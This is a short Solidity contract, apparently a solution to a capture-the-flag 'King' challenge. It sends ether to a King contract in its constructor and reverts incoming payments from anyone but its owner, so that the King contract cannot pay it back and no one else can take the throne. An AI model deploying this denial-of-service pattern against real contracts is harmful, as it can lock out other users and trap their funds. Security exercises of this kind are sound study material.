// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract KingForever {
    address public owner;

    constructor(King _king) payable {
        owner = msg.sender;
        (bool success, ) = payable(_king).call{value: msg.value}("");
        require(success, "Failed to send ether to king contract");
    }

    receive() external payable {
        require(msg.sender == owner, "Only owner can send funds");
    }
}
